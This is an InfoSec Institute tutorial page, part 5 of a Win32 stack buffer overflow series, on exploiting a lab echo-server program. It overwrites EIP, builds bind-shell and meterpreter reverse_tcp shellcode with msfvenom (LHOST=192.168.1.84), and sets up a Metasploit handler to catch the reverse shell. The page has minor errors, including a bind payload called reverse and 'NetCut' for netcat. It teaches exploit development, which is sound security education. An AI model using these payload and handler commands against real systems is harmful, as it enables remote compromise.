<!DOCTYPE html>
<html class="no-js" lang="en-US" prefix="og: http://ogp.me/ns#">
 <head>
  <meta charset="utf-8"/>
  <meta content="" name="description"/>
  <meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
  <meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible"/>
  <meta content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport"/>
  <link href="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/themes/infosec/style.css" rel="stylesheet"/>
  <link href="http://resources.infosecinstitute.com/xmlrpc.php" rel="pingback"/>
  <script>
   var ajaxUrl = 'http://resources.infosecinstitute.com/wp-admin/admin-ajax.php';
  </script>
  <!-- This site is optimized with the Yoast WordPress SEO plugin v2.2.1 - https://yoast.com/wordpress/plugins/seo/ -->
  <title>
   Writing Reverse TCP Exploit - InfoSec Institute
  </title>
  <meta content="In the previous article, we analyzed the Echo Server program in which we understood things like Crashing the program remotely by manipulating input with th" name="description"/>
  <link href="http://resources.infosecinstitute.com/stack-based-buffer-overflow-in-win-32-platform-part-5-writing-reverse-tcp-exploit/" rel="canonical"/>
  <meta content="en_US" property="og:locale"/>
  <meta content="article" property="og:type"/>
  <meta content="Writing Reverse TCP Exploit - InfoSec Institute" property="og:title"/>
  <meta content="In the previous article, we analyzed the Echo Server program in which we understood things like Crashing the program remotely by manipulating input with th" property="og:description"/>
  <meta content="http://resources.infosecinstitute.com/stack-based-buffer-overflow-in-win-32-platform-part-5-writing-reverse-tcp-exploit/" property="og:url"/>
  <meta content="InfoSec Institute" property="og:site_name"/>
  <meta content="general security" property="article:tag"/>
  <meta content="Exploit Development" property="article:section"/>
  <meta content="2015-05-22T07:00:09+00:00" property="article:published_time"/>
  <meta content="2015-05-22T08:58:36+00:00" property="article:modified_time"/>
  <meta content="2015-05-22T08:58:36+00:00" property="og:updated_time"/>
  <meta content="http://resources.infosecinstitute.com/wp-content/uploads/Buffer-Overflow02042014.jpg" property="og:image"/>
  <!-- / Yoast WordPress SEO plugin. -->
  <link href="http://resources.infosecinstitute.com/stack-based-buffer-overflow-in-win-32-platform-part-5-writing-reverse-tcp-exploit/feed/" rel="alternate" title="InfoSec Institute  Writing Reverse TCP Exploit Comments Feed" type="application/rss+xml"/>
  <script type="text/javascript">
   window._wpemojiSettings = {"baseUrl":"http:\/\/s.w.org\/images\/core\/emoji\/72x72\/","ext":".png","source":{"concatemoji":"http:\/\/resources.infosecinstitute.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.2.2"}};
			!function(a,b,c){function d(a){var c=b.createElement("canvas"),d=c.getContext&amp;&amp;c.getContext("2d");return d&amp;&amp;d.fillText?(d.textBaseline="top",d.font="600 32px Arial","flag"===a?(d.fillText(String.fromCharCode(55356,56812,55356,56807),0,0),c.toDataURL().length&gt;3e3):(d.fillText(String.fromCharCode(55357,56835),0,0),0!==d.getImageData(16,16,1,1).data[0])):!1}function e(a){var c=b.createElement("script");c.src=a,c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var f,g;c.supports={simple:d("simple"),flag:d("flag")},c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.simple&amp;&amp;c.supports.flag||(g=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",g,!1)):(a.attachEvent("onload",g),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&amp;&amp;c.readyCallback()})),f=c.source||{},f.concatemoji?e(f.concatemoji):f.wpemoji&amp;&amp;f.twemoji&amp;&amp;(e(f.twemoji),e(f.wpemoji)))}(window,document,window._wpemojiSettings);
  </script>
  <style type="text/css">
   img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
  </style>
  <link href="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/plugins/captcha/css/style.css?ver=4.2.2" id="cptch_stylesheet-css" media="all" rel="stylesheet" type="text/css"/>
  <link href="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/plugins/wpjobboard/public/css/wpjb-glyphs.css?ver=4.2.2" id="wpjb-glyphs-css" media="all" rel="stylesheet" type="text/css"/>
  <link href="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/plugins/wpjobboard/public/css/frontend.css?ver=4.3.1" id="wpjb-css-css" media="all" rel="stylesheet" type="text/css"/>
  <link href="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/plugins/enlighter/resources/EnlighterJS.min.css?ver=4.2.2" id="enlighter-local-css" media="all" rel="stylesheet" type="text/css"/>
  <!-- This site uses the Google Analytics by Yoast plugin v5.4.2 - Universal enabled - https://yoast.com/wordpress/plugins/google-analytics/ -->
  <script type="text/javascript">
   (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
		(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
		m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	})(window,document,'script','//www.google-analytics.com/analytics.js','__gaTracker');

	__gaTracker('create', 'UA-146509-8', 'auto');
	__gaTracker('set', 'forceSSL', true);
	__gaTracker('require', 'displayfeatures');
	__gaTracker('send','pageview');
  </script>
  <!-- / Google Analytics by Yoast -->
  <script src="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/themes/infosec/js/vendor/modernizr.min.js" type="text/javascript">
  </script>
  <script src="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/themes/infosec/js/vendor/device.min.js" type="text/javascript">
  </script>
  <script src="//ajax.googleapis.com/ajax/libs/mootools/1.5.1/mootools-yui-compressed.js?ver=4.2.2" type="text/javascript">
  </script>
  <script src="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/plugins/enlighter/resources/EnlighterJS.min.js?ver=4.2.2" type="text/javascript">
  </script>
  <link href="http://resources.infosecinstitute.com/xmlrpc.php?rsd" rel="EditURI" title="RSD" type="application/rsd+xml"/>
  <link href="http://resources.infosecinstitute.com/wp-includes/wlwmanifest.xml" rel="wlwmanifest" type="application/wlwmanifest+xml"/>
  <link href="http://resources.infosecinstitute.com/?p=31591" rel="shortlink"/>
  <script type="text/javascript">
   /* &lt;![CDATA[ */window.addEvent('domready', function(){if (typeof EnlighterJS == "undefined"){return;};EnlighterJS.Util.Init('pre.EnlighterJSRAW', 'code.EnlighterJSRAW', {"language":"standard","theme":"git","indent":-1,"hover":"hoverEnabled","showLinenumbers":true,"rawButton":true,"infoButton":true,"windowButton":true,"rawcodeDoubleclick":false,"grouping":true,"cryptex":{"enabled":true,"email":"mail@example.tld"}});});/* ]]&gt; */
  </script>
  <style id="syntaxhighlighteranchor" type="text/css">
  </style>
 </head>
 <body class="single single-post postid-31591 single-format-standard with-series">
  <div id="fb-root">
  </div>
  <header class="masthead">
   <div>
    <div class="col-3-3">
     <nav class="top-left">
      <ul>
       <li>
        <a href="http://infosecinstitute.com">
         InfoSec Institute
        </a>
        <ul>
         <li>
          <a href="http://www.infosecinstitute.com/courses/security.html">
           IT Security Boot Camps
          </a>
         </li>
         <li>
          <a href="http://www.infosecinstitute.com/infosec_institute/contact_us.html">
           Contact InfoSec
          </a>
         </li>
         <li>
          <a href="http://www.infosecinstitute.com/enterprise-wide-training2.html">
           Enterprise &amp; Government
          </a>
         </li>
        </ul>
       </li>
       <li>
        <a href="http://www.intenseschool.com">
         Intense School
        </a>
       </li>
      </ul>
     </nav>
     <nav class="top-right">
      <ul>
      </ul>
     </nav>
    </div>
   </div>
   <div>
    <div class="col-3-3">
     <div class="logo">
      <a href="http://resources.infosecinstitute.com">
       <img alt="InfoSec Institute" src="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/themes/infosec/assets/imagery/logo.svg" title="InfoSec Institute" width="126"/>
      </a>
     </div>
     <a class="menu-button mobile" data-attr="main:toggle" href="#site-navigation">
      Menu
     </a>
     <nav class="main" id="site-navigation">
      <a aria-hidden="true" class="mobile" data-attr="main:remove" href="#">
       Close Menu
      </a>
      <a aria-hidden="true" class="mobile" data-attr="topics:remove" href="#">
       Back
      </a>
      <a aria-hidden="true" class="mobile" data-attr="content-archives:remove" href="#">
       Back
      </a>
      <ul>
       <li class="mobile menu-item menu-item-type-custom menu-item-object-custom menu-item-4748">
        <a href="http://infosec.wpengine.com">
         Return Home
        </a>
       </li>
       <li class="has-dropdown menu-item menu-item-type-custom menu-item-object-custom menu-item-4750 menu-item-has-children">
        <a data-attr="topics:set" href="">
         Topics
        </a>
        <ul data-menu-container="topics">
         <li>
          <a href="http://resources.infosecinstitute.com/category/hacking-2/" title="Hacking">
           Hacking
          </a>
         </li>
         <li>
          <a href="http://resources.infosecinstitute.com/category/certifications-training/" title="IT Certifications">
           IT Certifications
          </a>
         </li>
         <li>
          <a href="http://resources.infosecinstitute.com/category/forensics-2/" title="Forensics">
           Forensics
          </a>
         </li>
         <li>
          <a href="http://resources.infosecinstitute.com/category/application-security-2/" title="Application Security">
           Application Security
          </a>
         </li>
         <li>
          <a href="http://resources.infosecinstitute.com/category/pen-testing-1/" title="Penetration Testing">
           Penetration Testing
          </a>
         </li>
         <li>
          <a href="http://resources.infosecinstitute.com/category/general-security-2/" title="General Security">
           General Security
          </a>
         </li>
         <li>
          <a href="http://resources.infosecinstitute.com/category/interviews/" title="Interviews">
           Interviews
          </a>
         </li>
         <li>
          <a href="http://resources.infosecinstitute.com/category/virtualization-security/" title="Virtualization Security">
           Virtualization Security
          </a>
         </li>
         <li>
          <a href="http://resources.infosecinstitute.com/category/wireless-security/" title="Wireless Security">
           Wireless Security
          </a>
         </li>
         <li>
          <a href="http://resources.infosecinstitute.com/category/scada-2/" title="SCADA">
           SCADA
          </a>
         </li>
         <li>
          <a href="http://resources.infosecinstitute.com/category/reverse-engineering-2/" title="Reverse Engineering">
           Reverse Engineering
          </a>
         </li>
         <li>
          <a href="http://resources.infosecinstitute.com/category/data-recovery/" title="Data Recovery">
           Data Recovery
          </a>
         </li>
         <li>
          <a href="http://resources.infosecinstitute.com/category/exploit-development/" title="Exploit Development">
           Exploit Development
          </a>
         </li>
         <li>
          <a href="http://resources.infosecinstitute.com/category/compliance-auditing/" title="Management, Compliance, &amp; Auditing">
           Management, Compliance, &amp; Auditing
          </a>
         </li>
         <li>
          <a href="http://resources.infosecinstitute.com/category/incident-response-resources/" title="Incident Response">
           Incident Response
          </a>
         </li>
         <li>
          <a href="http://resources.infosecinstitute.com/category/certifications-training/cisa/" title="CISA">
           CISA
          </a>
         </li>
         <li>
          <a href="http://resources.infosecinstitute.com/category/certifications-training/cism/" title="CISM">
           CISM
          </a>
         </li>
         <li>
          <a href="http://resources.infosecinstitute.com/category/certifications-training/cissp/" title="CISSP">
           CISSP
          </a>
         </li>
        </ul>
       </li>
       <li class=" menu-item menu-item-type-post_type menu-item-object-page menu-item-4758">
        <a href="http://resources.infosecinstitute.com/contributors/">
         Contributors
        </a>
       </li>
       <li class="has-dropdown desktop menu-item menu-item-type-custom menu-item-object-custom menu-item-30046 menu-item-has-children">
        <a data-attr="content-archives:set" href="#">
         Content Archives
        </a>
        <ul data-menu-container="content-archives">
         <li>
          <a href="http://resources.infosecinstitute.com/2015/" title="2015">
           2015
          </a>
         </li>
         <li>
          <a href="http://resources.infosecinstitute.com/2014/" title="2014">
           2014
          </a>
         </li>
         <li>
          <a href="http://resources.infosecinstitute.com/2013/" title="2013">
           2013
          </a>
         </li>
         <li>
          <a href="http://resources.infosecinstitute.com/2012" title="2012">
           2012
          </a>
         </li>
         <li>
          <a href="http://resources.infosecinstitute.com/2011" title="2011">
           2011
          </a>
         </li>
         <li>
          <a href="http://resources.infosecinstitute.com/2010" title="2010">
           2010
          </a>
         </li>
        </ul>
       </li>
       <li class="mobile menu-item menu-item-type-custom menu-item-object-custom menu-item-30121">
        <a href="http://resources.infosecinstitute.com/2015">
         Content Archives
        </a>
       </li>
       <li class=" menu-item menu-item-type-custom menu-item-object-custom menu-item-32332">
        <a href="http://certs.infosecinstitute.com">
         Certification Tracker
        </a>
       </li>
      </ul>
     </nav>
     <nav class="search">
      <form action="http://www2.infosecinstitute.com/s/12882/ntpoCCBNQ1ttbNTP3ylPLZZeUqLrVgCT" class="search-form" method="get">
       <fieldset>
        <input class="icon search" id="search" name="s" type="text" value=""/>
        <input class="icon search" title="Search" type="submit"/>
       </fieldset>
      </form>
     </nav>
    </div>
   </div>
  </header>
  <main>
   <section class="hero full">
    <div class="col-3-3 wrapper hook" style="background-image: url('http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads//Buffer-Overflow02042014-980x0-c-default.jpg');">
     <header>
      <h2>
       Stack Based Buffer Overflow in Win 32 Platform - Part 5
      </h2>
      <h1>
       Writing Reverse TCP Exploit
      </h1>
     </header>
     <nav class="jump">
      <label>
       Jump to
      </label>
      <div class="dropdown">
       <span data-trigger="">
        Select post section
       </span>
       <ul>
        <li>
         <a href="http://resources.infosecinstitute.com/stack-based-buffer-overflow-in-win-32-platform-part-1/#article">
          Part 1 - Stack Based Buffer Overflow in Win 32 Platform: The Basics
         </a>
        </li>
        <li>
         <a href="http://resources.infosecinstitute.com/stack-based-buffer-overflow-in-win-32-platform-part-2/#article">
          Part 2 - Taking Control of the Process
         </a>
        </li>
        <li>
         <a href="http://resources.infosecinstitute.com/stack-based-buffer-overflow-in-win32-platform-part-3-overwriting-the-stack/#article">
          Part 3 - Overwriting the Stack
         </a>
        </li>
        <li>
         <a href="http://resources.infosecinstitute.com/stack-based-buffer-overflow-in-win-32-platform-part-4-analyzing-buffer-remotely/#article">
          Part 4 - Analyzing Buffer Remotely
         </a>
        </li>
        <li class="current">
         Part 5 - Writing Reverse TCP Exploit
        </li>
        <li>
         <a href="http://resources.infosecinstitute.com/stack-based-buffer-overflow-in-win-32-platform-part-6-dealing-with-bad-characters-jmp-instruction/#article">
          Part 6 - Dealing with Bad Characters &amp; JMP Instruction
         </a>
        </li>
        <li>
         <a href="http://resources.infosecinstitute.com/stack-based-buffer-overflow-in-win-32-platform-part-7-analyzing-and-writing-a-local-exploit/#article">
          Part 7 - Analyzing and Writing a Local Exploit
         </a>
        </li>
        <li>
         <a href="http://resources.infosecinstitute.com/stack-based-buffer-overflow-in-win-32-platform-part-8/#article">
          Part 8 - Analyzing and Writing a Local Exploit 2
         </a>
        </li>
       </ul>
       <select>
        <option value="http://resources.infosecinstitute.com/stack-based-buffer-overflow-in-win-32-platform-part-1/#article">
         Part 1 - Stack Based Buffer Overflow in Win 32 Platform: The Basics
        </option>
        <option value="http://resources.infosecinstitute.com/stack-based-buffer-overflow-in-win-32-platform-part-2/#article">
         Part 2 - Taking Control of the Process
        </option>
        <option value="http://resources.infosecinstitute.com/stack-based-buffer-overflow-in-win32-platform-part-3-overwriting-the-stack/#article">
         Part 3 - Overwriting the Stack
        </option>
        <option value="http://resources.infosecinstitute.com/stack-based-buffer-overflow-in-win-32-platform-part-4-analyzing-buffer-remotely/#article">
         Part 4 - Analyzing Buffer Remotely
        </option>
        <option selected="">
         Part 5 - Writing Reverse TCP Exploit
        </option>
        <option value="http://resources.infosecinstitute.com/stack-based-buffer-overflow-in-win-32-platform-part-6-dealing-with-bad-characters-jmp-instruction/#article">
         Part 6 - Dealing with Bad Characters &amp; JMP Instruction
        </option>
        <option value="http://resources.infosecinstitute.com/stack-based-buffer-overflow-in-win-32-platform-part-7-analyzing-and-writing-a-local-exploit/#article">
         Part 7 - Analyzing and Writing a Local Exploit
        </option>
        <option value="http://resources.infosecinstitute.com/stack-based-buffer-overflow-in-win-32-platform-part-8/#article">
         Part 8 - Analyzing and Writing a Local Exploit 2
        </option>
       </select>
      </div>
     </nav>
     <div class="share vertical">
      <ul>
       <li class="twitter">
        <a class="twitter-share-button" data-count="vertical" data-count-url="http://resources.infosecinstitute.com/stack-based-buffer-overflow-in-win-32-platform-part-5-writing-reverse-tcp-exploit/" data-hashtags="infosec" data-related="infosecedu" data-size="medium" data-text="Writing Reverse TCP Exploit" data-url="http://resources.infosecinstitute.com/stack-based-buffer-overflow-in-win-32-platform-part-5-writing-reverse-tcp-exploit/" data-via="InfosecEdu" href="https://twitter.com/share">
         Tweet
        </a>
       </li>
       <li class="google">
        <div class="g-plus" data-action="share" data-annotation="vertical-bubble">
        </div>
       </li>
       <li class="linkedin">
        <script data-counter="top" type="IN/Share">
        </script>
       </li>
       <li class="reddit">
        <script src="//www.redditstatic.com/button/button2.js" type="text/javascript">
        </script>
       </li>
       <li class="facebook">
        <div class="fb-like" data-action="like" data-layout="box_count" data-share="false" data-show-faces="false" data-width="90">
        </div>
       </li>
      </ul>
     </div>
    </div>
   </section>
   <section class="content full">
    <div class="col-3-3 wrapper">
     <div class="main post-col-3-3">
      <article class="post-content">
       <div id="article">
       </div>
       <p>
        In the
        <a href="http://resources.infosecinstitute.com/stack-based-buffer-overflow-in-win-32-platform-part-4-analyzing-buffer-remotely/" target="_blank">
         previous
        </a>
        article, we analyzed the Echo Server program in which we understood things like Crashing the program remotely by manipulating input with the help of tools, Identifying the overwritten position in the memory etc. Given below are some notable points from the previous article that will be used in this article.
       </p>
       <ul>
        <li>
         <div>
          Server Program is crashed after inputting the 2000 character as in input.
         </div>
        </li>
        <li>
         <div>
          EIP overwritten position is 8-byte data after the 1036 input.
         </div>
        </li>
       </ul>
       <p>
        <em>
         Note: Kindly read the
         <a href="http://resources.infosecinstitute.com/author/nikhil-kumar/" target="_blank">
          previous articles
         </a>
         , as this article is a follow up of the same.
        </em>
       </p>
       <p>
        We assume that readers have enough knowledge about how to crash an echo server program and about identifying the return address position by manipulating user input with the help of special scripts. In this article, we will be developing and working an exploit for the Echo Server program. Now, lets proceed.
       </p>
       <p>
        So, lets run our python script again on machine B and following will be the output on the Machine A.
       </p>
       <p>
        <img alt="" src="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads/052015_1112_StackBasedB1.png"/>
       </p>
       <p>
        We can see in the above screenshot that EIP is overwritten by 42424242 (Bs in Hexadecimal) and Top of the Stack is holding to 43434343(Cs in Hexadecimal). So, for better understanding, lets do some changes in the python script. As of now, our python script is following.
       </p>
       <p>
        <img alt="" src="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads/052015_1112_StackBasedB2.png"/>
       </p>
       <p>
        Now, we will append another 4 Cs after the Bs and then some Ds in the python script. After making these changes the script will look like the one given below.
       </p>
       <p>
        <img alt="" src="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads/052015_1112_StackBasedB3.png"/>
       </p>
       <p>
        After saving the script, restart the Echo-Server program which is running with debugger in Machine A. We could do the same by pressing CTRL+F2. Now, after running the above python script we can see that the server program is again crashed which can be seen in the screenshot given below.
       </p>
       <p>
        <img alt="" src="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads/052015_1112_StackBasedB4.png"/>
       </p>
       <p>
        When we closely look into the debugger, we notice the following things.
       </p>
       <ul>
        <li>
         <div>
          EIP is pointing 42424242 which is our Bs
         </div>
        </li>
        <li>
         <div>
          Top of Stack is holding the value 43434343 which is our Cs
         </div>
        </li>
        <li>
         <div>
          After that, we can see there are multiple 44444444 values in the stack that are filled by the user input.
         </div>
        </li>
       </ul>
       <p>
        We can see the same in the following screenshot.
       </p>
       <p style="text-align: center;">
        <img alt="" src="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads/052015_1112_StackBasedB5.png"/>
       </p>
       <p>
        <strong>
         Overwriting EIP
        </strong>
       </p>
       <p>
        As we have already seen in previous
        <a href="http://resources.infosecinstitute.com/articles/">
         articles
        </a>
        , that if we change the EIP position in the memory we can actually change the way of the program execution. So lets change the EIP register value with Cs address. The Cs (43434343) address in the memory is 0022F730. We can also see the same in the above screenshot. Now, we will have to replace the Bs with 0022F730 in the python script that we have created in machine B. However; it is a little tricky to write the memory address in the user input. We know that stack works with Last-in-First-Out rule, so we will have to write the address in reverse order. So, the Cs address would be.
       </p>
       <p>
        \x30\xf7\x22\x00
       </p>
       <p>
        Now, in python script lets replace Bs with this address. After making the above change in the script the python script will look like this.
       </p>
       <p>
        <img alt="" src="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads/052015_1112_StackBasedB6.png"/>
       </p>
       <p>
        It can be seen in the above screenshot that we have replaced Bs with the Cs address, now lets create a break point on the RETN instruction in the machine A so that we can analyse the things in a better way.
        <strong>
         (We have already explained the basics like what is breakpoint, how do we create breakpoints and what is RETN instruction etc. in
         <a href="http://resources.infosecinstitute.com/author/nikhil-kumar/" target="_blank">
          previous articles
         </a>
         , so we are not going to explain it here.)
        </strong>
       </p>
       <p>
        <img alt="" src="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads/052015_1112_StackBasedB7.png"/>
       </p>
       <p>
        As shown in the above screenshot, we have created the breakpoint in the debugger. Now, we will run the program in debugger, and run the python script on the machine B and we will see the following output on the machine A.
       </p>
       <p>
        <img alt="" src="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads/052015_1112_StackBasedB8.png"/>
       </p>
       <p>
        As can be seen in the above screenshot that the program execution has reached to the RETN instruction where we had created the breakpoint in previous steps. But if we closely look into the debugger we can see some interesting things which can be seen in following screen shot.
       </p>
       <p style="text-align: center;">
        <img alt="" src="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads/052015_1112_StackBasedB9.png"/>
       </p>
       <p>
        In the above screenshot, we can see the instant of Bs Stack is overwritten by the C address which is just the very next instruction address in the stack and holding the value Cs. Now, when we do Step Into in the debugger by pressing the F7 key we can see that the program execution control has switched to the next instruction and now top of the stack is showing the value 43434343, which is the value of C in Hexadecimal. We can see the same in following screenshot.
       </p>
       <p>
        <img alt="" src="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads/052015_1112_StackBasedB10.png"/>
       </p>
       <p>
        Until now, we have successfully overwritten the EIP value by changing the user input and control the execution of the program.
       </p>
       <p>
        Now, we will put some special type of code in the user input so that we can do some more interesting things. This special type of code is called the Shell Code.
       </p>
       <p>
        <strong>
         Shell Code:
        </strong>
       </p>
       <p>
        A Shell Code is a piece of code that is directly executed by the computer. Shell Codes generally do not require any kind of compilation process before execution that is why the shell code is machine independent. We can create a shell code by ourselves or we can also use some other tools to generate the Shell Code.
       </p>
       <p>
        <strong>
         Generating Reverse TCP Payload:
        </strong>
       </p>
       <p>
        In this exploit writing
        <a href="http://resources.infosecinstitute.com/series/">
         series
        </a>
        , we will use Metasploit Tool, which is available by default in Kali Linux Machine to generate our shell code.
       </p>
       <p>
        To generate the shell code we are going to use a utility called Msfvenom. We can generate the shell code by running the following command. Here, we are using a TCP reverse connection shell code that will open 4444 port on the server. (There are multiple shell codes or payload is available which could be used according to the requirements.)
       </p>
       <p>
        <em>
         msfvenom -p windows/shell_bind_tcp -f c -a x68
        </em>
       </p>
       <p>
        <img alt="" src="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads/052015_1112_StackBasedB11.png"/>
       </p>
       <p>
        <strong>
         Setting Up the Payload with the Exploit:
        </strong>
       </p>
       <p>
        It can be seen in the above screenshot that our payload is successfully generated. Now, we will copy the exploit code and replace the Ds in the python script with this code. After these changes, the python script will look like this.
       </p>
       <p>
        <img alt="" src="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads/052015_1112_StackBasedB12.png"/>
       </p>
       <p>
        Now, after saving this python script, we will restart the debugger in machine A and run the python script again in machine B.
       </p>
       <p>
        <img alt="" src="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads/052015_1112_StackBasedB13.png"/>
       </p>
       <p>
        As we can see in the above screenshot, the server program is again reached to the RETN instruction, now, we continue the program by hitting the F9 key.
       </p>
       <p>
        <img alt="" src="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads/052015_1112_StackBasedB14.png"/>
       </p>
       <p>
        <strong>
         Exploit Execution and getting the Reverse Shell:
        </strong>
       </p>
       <p>
        We can see in the above screen shot, after continuing the execution, the Echo Server program does not crash as per the previous cases. This would be great news for us.
       </p>
       <p>
        The shell code, which we have inserted by the user input, is executing in the computer memory that is the reason, program does not crashed. So, now lets try to connect with NetCut on 4444 port by the machine B.
       </p>
       <p>
        <img alt="" src="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads/052015_1112_StackBasedB15.png"/>
       </p>
       <p>
        As can be seen in the above screenshot, we have successfully exploited the Echo Server EXE program and got the command shell. Now, lets run the Echo Server program without the debugger on machine A and launch the python script to verify the same.
       </p>
       <p>
        <img alt="" src="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads/052015_1112_StackBasedB16.png"/>
       </p>
       <p>
        As shown in the above screenshot, we have run Echo Server program on machine A and run the python script on machine B but the server program does not crash. When we hit the NetCut tool on 4444 port, we successfully got the TCP connection on the attacker machine B.
       </p>
       <p>
        <strong>
         Generating Setting up the Metrepreter Payload:
        </strong>
       </p>
       <p>
        So, we have successfully created a Reverse TCP exploit for Echo Server program. Now, lets inject another payload in the exploit that will give us the meterpreter shell.
       </p>
       <p>
        First, we will have to create a shell code for the payload; we can do the same by executing the following command on the terminal.
       </p>
       <p>
        <em>
         msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.84 -f c -a x86
        </em>
       </p>
       <p>
        In this command, we have used an IP address that is the kali Linux machine IP address where the reverse connection will come when we send our exploit.
       </p>
       <p>
        <img alt="" src="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads/052015_1112_StackBasedB17.png"/>
       </p>
       <p>
        Our small payload is ready; now replace the payload in the python script with the previous one. We will also have to prepare the Metasploit console to accept the reverse connection.
       </p>
       <p>
        So lets start the Metasploit in the attacker machine which is machine B and run the following command to launch the Metasploit.
       </p>
       <p>
        <em>
         msfconsole
        </em>
       </p>
       <p>
        It will take some time to start, after the Metasploit starts we can see the following screen.
       </p>
       <p>
        <img alt="" src="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads/052015_1112_StackBasedB18.png"/>
       </p>
       <p>
        Now, run the following command to setup the handler.
       </p>
       <ul>
        <li>
         Use exploit/multi/handler
        </li>
       </ul>
       <p>
        After that hit another command
       </p>
       <ul>
        <li>
         set PAYLOAD windows/meterpreter/reverse_tcp
        </li>
       </ul>
       <p>
        After this, we will have to set the Host IP address (It is the Kali Linux Machine IP Address), the command for the same is following.
       </p>
       <ul>
        <li>
         set LHOST 192.168.1.84
        </li>
       </ul>
       <p>
        Now, we need to hit another command
       </p>
       <ul>
        <li>
         exploit
        </li>
       </ul>
       <p>
        We can see all these commands in the following screenshot.
       </p>
       <p>
        <img alt="" src="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads/052015_1112_StackBasedB19.png"/>
       </p>
       <p>
        <strong>
         Exploitation with Meterpreter:
        </strong>
       </p>
       <p>
        Now, everything is set from the attackers side on machine B. So, we will run the Echo Server program on the machine A and the python script on machine B and verify whether we get the reverse connection or not.
       </p>
       <p>
        <img alt="" src="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads/052015_1112_StackBasedB20.png"/>
       </p>
       <p>
        As can be seen in the above screenshot, we got the reverse connection from the victim machine. That is a great news for us.
       </p>
       <p>
        <strong>
         We have understood the following things by completing this exercise:
        </strong>
       </p>
       <ul>
        <li>
         Creating the Shell Code with the help of Metasploit
        </li>
        <li>
         Writing Reverse TCP exploit for Echo Server Application
        </li>
        <li>
         Exploiting the Application with Different Payload
        </li>
       </ul>
       <p>
        <strong>
         References:
        </strong>
       </p>
       <ul>
        <li>
         https://www.owasp.org/index.php/Buffer_overflow_attack
        </li>
        <li>
         http://en.wikipedia.org/wiki/C_file_input/output
        </li>
        <li>
         http://www.exploit-db.com/
        </li>
        <li>
         http://www.pentesteracademy.com/
        </li>
        <li>
         https://www.corelan.be/
        </li>
       </ul>
       <nav class="series-pagination">
        <ul>
         <li class="prev">
          <a href="http://resources.infosecinstitute.com/stack-based-buffer-overflow-in-win-32-platform-part-4-analyzing-buffer-remotely/#article" rel="prev">
           Prev: Analyzing Buffer Remotely
          </a>
         </li>
         <li class="next">
          <a href="http://resources.infosecinstitute.com/stack-based-buffer-overflow-in-win-32-platform-part-6-dealing-with-bad-characters-jmp-instruction/#article" rel="next">
           Next: Dealing with Bad Characters &amp; JMP Instruction
          </a>
         </li>
        </ul>
       </nav>
      </article>
      <section class="post-author large">
       <div class="image">
